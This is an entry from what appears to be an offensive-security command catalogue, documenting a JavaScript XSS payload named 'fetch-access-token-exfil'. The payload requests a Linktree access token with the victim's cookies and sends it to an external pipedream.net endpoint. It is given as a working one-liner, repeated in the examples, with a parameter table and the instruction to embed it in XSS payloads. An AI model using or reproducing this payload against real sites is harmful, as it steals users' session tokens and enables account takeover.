---
data: >-
  await
  fetch("https://linktr.ee/api/token",{"credentials":"include","method":"GET"}).then((response)=>
  response.json()).then((responseJson)=>{fetch("https://en2celr7rewbul.m.pipedream.net/?token="+responseJson["accessToken"]);})
tags:
  - exfil
  - token-theft
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:38.278Z'
id: c18b6a6b-c953-4975-ab4f-2752222d35cc
verified: false
validated: true
submitted: true
---
# fetch-access-token-exfil

## Command

```javascript
await fetch("https://linktr.ee/api/token",{"credentials":"include","method":"GET"}).then((response)=> response.json()).then((responseJson)=>{fetch("https://en2celr7rewbul.m.pipedream.net/?token="+responseJson["accessToken"]);})
```

## Description

This async JavaScript fetches the access token from Linktree's API using included credentials, parses the JSON, and exfiltrates it to an external server via a second fetch. Embed in XSS payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| credentials: "include" | Sends cookies for auth | Yes |
| method: "GET" | HTTP method for API call | Yes |
| exfil URL | Attacker's server endpoint | Yes |
| responseJson["accessToken"] | Token key in JSON | Yes |

## Examples

### Basic Usage

```javascript
await fetch("https://linktr.ee/api/token",{"credentials":"include","method":"GET"}).then((response)=> response.json()).then((responseJson)=>{fetch("https://en2celr7rewbul.m.pipedream.net/?token="+responseJson["accessToken"]);})
```

### Advanced Usage

```javascript
// With error handling
await fetch(...).catch(err => console.log(err));
```

## Expected Output

First fetch returns JSON with accessToken; second sends it as query param to pipedream.net, visible in server logs.

## Related

- [[commands/javascript-uri-xss-payload]]
- [[procedures/Exploit-XSS-to-Fetch-and-Exfiltrate-Access-Token]]
